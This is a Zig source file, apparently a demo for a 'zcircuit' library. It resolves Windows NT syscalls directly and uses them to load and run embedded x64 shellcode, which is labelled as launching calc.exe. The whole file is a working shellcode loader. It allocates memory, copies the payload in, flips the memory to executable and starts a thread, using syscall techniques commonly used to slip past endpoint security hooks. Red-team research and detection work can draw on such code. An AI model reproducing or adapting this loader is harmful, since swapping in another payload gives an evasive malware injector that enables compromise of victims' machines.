const std = @import("std");
const zc = @import("zcircuit");
const windows = std.os.windows;

pub fn main() !void {
    // Standard x64 calc.exe shellcode
    const shellcode = [_]u8{ 0x48, 0x31, 0xff, 0x48, 0xf7, 0xe7, 0x65, 0x48, 0x8b, 0x58, 0x60, 0x48, 0x8b, 0x5b, 0x18, 0x48, 0x8b, 0x5b, 0x20, 0x48, 0x8b, 0x1b, 0x48, 0x8b, 0x1b, 0x48, 0x8b, 0x5b, 0x20, 0x49, 0x89, 0xd8, 0x8b, 0x5b, 0x3c, 0x4c, 0x01, 0xc3, 0x48, 0x31, 0xc9, 0x66, 0x81, 0xc1, 0xff, 0x88, 0x48, 0xc1, 0xe9, 0x08, 0x8b, 0x14, 0x0b, 0x4c, 0x01, 0xc2, 0x4d, 0x31, 0xd2, 0x44, 0x8b, 0x52, 0x1c, 0x4d, 0x01, 0xc2, 0x4d, 0x31, 0xdb, 0x44, 0x8b, 0x5a, 0x20, 0x4d, 0x01, 0xc3, 0x4d, 0x31, 0xe4, 0x44, 0x8b, 0x62, 0x24, 0x4d, 0x01, 0xc4, 0xeb, 0x32, 0x5b, 0x59, 0x48, 0x31, 0xc0, 0x48, 0x89, 0xe2, 0x51, 0x48, 0x8b, 0x0c, 0x24, 0x48, 0x31, 0xff, 0x41, 0x8b, 0x3c, 0x83, 0x4c, 0x01, 0xc7, 0x48, 0x89, 0xd6, 0xf3, 0xa6, 0x74, 0x05, 0x48, 0xff, 0xc0, 0xeb, 0xe6, 0x59, 0x66, 0x41, 0x8b, 0x04, 0x44, 0x41, 0x8b, 0x04, 0x82, 0x4c, 0x01, 0xc0, 0x53, 0xc3, 0x48, 0x31, 0xc9, 0x80, 0xc1, 0x07, 0x48, 0xb8, 0x0f, 0xa8, 0x96, 0x91, 0xba, 0x87, 0x9a, 0x9c, 0x48, 0xf7, 0xd0, 0x48, 0xc1, 0xe8, 0x08, 0x50, 0x51, 0xe8, 0xb0, 0xff, 0xff, 0xff, 0x49, 0x89, 0xc6, 0x48, 0x31, 0xc9, 0x48, 0xf7, 0xe1, 0x50, 0x48, 0xb8, 0x9c, 0x9e, 0x93, 0x9c, 0xd1, 0x9a, 0x87, 0x9a, 0x48, 0xf7, 0xd0, 0x50, 0x48, 0x89, 0xe1, 0x48, 0xff, 0xc2, 0x48, 0x83, 0xec, 0x20, 0x41, 0xff, 0xd6, 0xEB, 0xFE };
    const my_circuit = zc.Zcircuit(.{ .seed = 0xABCD1234 });

    var circuit = try my_circuit.init();

    var base_addr: usize = 0;
    var size: usize = shellcode.len;

    const nt_allocate_virtual_memory = circuit.getSyscall("NtAllocateVirtualMemory", .{}) orelse return;

    const current_process = @as(std.os.windows.HANDLE, @ptrFromInt(@as(usize, @bitCast(@as(isize, -1)))));
    log("NtAllocateVirtualMemory", nt_allocate_virtual_memory);
    const alloc_status = nt_allocate_virtual_memory.call(.{
        current_process,
        &base_addr,
        0,
        &size,
        0x3000, // MEM_COMMIT | MEM_RESERVE
        0x04, // RW
    });
    if (alloc_status == windows.NTSTATUS.SUCCESS) {
        std.debug.print("[+] Memory allocated at: 0x{x}\n", .{base_addr});
    }

    const buffer: [*]u8 = @ptrFromInt(base_addr);
    std.mem.copyForwards(u8, buffer[0..shellcode.len], &shellcode);

    const nt_protect_virtual_memory = circuit.getSyscall("NtProtectVirtualMemory", .{}) orelse return;
    log("NtProtectVirtualMemory", nt_protect_virtual_memory);

    var old_protect: u32 = 0;
    const prot_status = nt_protect_virtual_memory.call(.{
        current_process,
        &base_addr,
        &size,
        0x20, // RX
        &old_protect,
    });
    if (prot_status == windows.NTSTATUS.SUCCESS) {
        std.debug.print("[+] Memory protected!\n", .{});
    }

    const nt_create_thread = circuit.getSyscall("NtCreateThreadEx", .{}) orelse return;
    log("NtCreateThreadEx", nt_create_thread);

    var h_thread: ?std.os.windows.HANDLE = null;
    const thread_status = nt_create_thread.call(.{
        &h_thread,
        0x1FFFFF,
        null,
        current_process,
        base_addr,
        null,
        false,
        null,
        null,
        null,
        null,
    });
    if (thread_status == windows.NTSTATUS.SUCCESS) {
        std.debug.print("[+] Thread created!\n", .{});
    }

    const nt_wait = circuit.getSyscall("NtWaitForSingleObject", .{}) orelse return;
    log("NtWaitForSingleObject", nt_wait);

    const wait_status = nt_wait.call(.{
        h_thread.?,
        false,
        null,
    });
    _ = wait_status;
}

fn log(name: []const u8, syscall: zc.Syscall) void {
    std.debug.print("[+] Resolved {s} -> SSN: 0x{X:0>2}, Base: 0x{X}\n", .{ name, syscall.ssn, syscall.address });
}
